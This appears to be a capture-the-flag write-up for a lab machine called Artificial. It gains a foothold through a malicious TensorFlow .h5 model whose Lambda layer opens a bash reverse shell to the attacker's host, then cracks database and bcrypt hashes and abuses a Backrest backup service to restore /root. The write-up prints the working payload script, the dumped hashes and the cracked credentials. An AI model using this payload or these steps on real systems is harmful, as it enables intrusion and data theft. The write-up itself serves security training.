Summary

Summary of the attack path:

  • Vulnerable model upload — a TensorFlow .h5 file with a malicious Lambda layer, CVE-2025-9905.
  • Building the exploit in a Docker container that matches tensorflow-cpu==2.13.1.
  • Reading the app database and cracking the stored hashes.
  • Abusing a misconfigured local backup app (Backrest) to recover the root file.

1. Enumeration

I started with a full port scan:

sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.232.51

Next, I checked the versions of the open services and ran the default scripts:

nmap -sVC -p 22,80 10.129.232.51 //artificial.htb/

The HTTP port hosts a login page. I registered a new account there.

2. Foothold

The requirements file for the app lists this package:

tensorflow-cpu==2.13.1

The upload function accepts .h5 files, which are Keras model files. Searching for a vulnerability that combines this TensorFlow version with .h5 models led me to CVE-2025-9905. The script below builds a malicious .h5 file. When the server loads the model, the Lambda layer runs my reverse shell.

import tensorflow as tf def exploit(x): import os os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.235/4444 0>&1'") return x model = tf.keras.Sequential() model.add(tf.keras.layers.Input(shape=(64,))) model.add(tf.keras.layers.Lambda(exploit)) model.compile() model.save("exploit.h5")

The script needs the exact TensorFlow version from the requirements, so I ran it inside a Docker container.

First, I created a working directory and moved into it:

mkdir /tmp/test cd /tmp/test

After reading the Dockerfile, I downloaded the matching wheel (Python 3.8, tensorflow_cpu 2.13.1):

curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

Then I started a Python 3.8 container with the working directory mounted, and installed the wheel inside it:

sudo docker run -it -v $(pwd):/tmp/test python:3.8-slim bash
cd /tmp/test pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

With the environment ready, I ran the exploit to generate exploit.h5. I uploaded the file and opened a listener on my machine. The upload triggered the shell as app on artificial.

nc -lvnp 4444

The reverse shell target (10.10.14.235:4444) must be my own VPN address, and the listener must be running before the upload.

Shell upgrade

The reverse shell has no proper terminal, so I upgraded it to a fully interactive one. On the target (app@artificial), I spawned a PTY:

python3 -c 'import pty; pty.spawn("/bin/bash")'

Then I pressed Ctrl + Z to background the shell. On my machine, I set the local terminal to raw mode and brought the shell back to the foreground:

stty raw -echo ; fg

Next, I reset the terminal, started screen, and set the environment variables and terminal size:

reset screen export TERM=xterm export SHELL=bash stty rows 40 columns 100

3. Lateral Movement

Inside the application's app.py, I found the secret key and the database location:

app.secret_key = "Sup3rS3cr3tKey4rtIfici4L" app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'

The SQLite database is in the instance directory, so I opened it there:

app@artificial:~/app/instance$ sqlite3 users.db
sqlite> .tables model user sqlite> select * from user; 1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8 2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb 3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36 4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6 5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0 6|test|test@htb.com|cc03e747a6afbbcbf8be7668acfebee5

4. Privilege Escalation

Root

I noticed that gael is a member of the sysadm group, so I searched the filesystem for files that group can access:

find / -group sysadm -maxdepth 30 -ls 2>/dev/null

This revealed /var/backups/backrest_backup.tar.gz. I started a web server on the target and downloaded the file to my machine:

python3 -m http.server 8000
wget http://10.129.232.51:8000/backrest_backup.tar.gz

Then I extracted the archive:

tar -xvf backrest_backup.tar.gz

The archive contains a hidden directory with a config.json file:

"name": "backrest_root", "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"

The value is Base64-encoded. Decoding it gives a bcrypt hash:

$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO

I saved the hash to a file and cracked it with hashcat (mode 3200 is bcrypt):

hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
Credentials backrest_root : !@#$%^

Next, I checked which ports were listening locally:

ss -tulpn ...<SNIP>... tcp LISTEN 0 2048 127.0.0.1:5000 0.0.0.0:* tcp LISTEN 0 4096 127.0.0.1:9898 0.0.0.0:* ...<SNIP>...

Port 9898 is bound only to localhost, so I forwarded it over SSH:

ssh -L 9898:127.0.0.1:9898 gael@10.129.232.51

Then I opened http://127.0.0.1:9898 in my browser, where the Backrest app was running.

I logged in with the credentials I cracked earlier. While trying to add a plan, I found the app's guide, which explains how to set up a backup.

The guide has three steps: Add repo, Add plan, and Back up now.

I clicked Back Up Now. The green box on the right showed that the /root repository had been backed up.

Since the backup contains /root, I used Restore to path to download a copy to my machine.

The download is a .tar.gz archive, so I extracted it:

tar -xvf archive-2026-04-02-22-44-04.tar.gz
